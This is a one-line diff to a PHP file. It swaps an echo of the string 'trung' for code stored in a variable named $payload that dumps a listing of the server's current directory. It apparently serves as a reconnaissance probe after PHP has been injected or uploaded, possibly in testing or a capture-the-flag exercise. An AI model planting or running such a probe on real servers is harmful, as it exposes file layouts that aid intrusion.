@@ -1,1 +1,1 @@
-<?php echo 'trung'; ?>
+<?php $payload = var_dump(scandir('.')); ?>
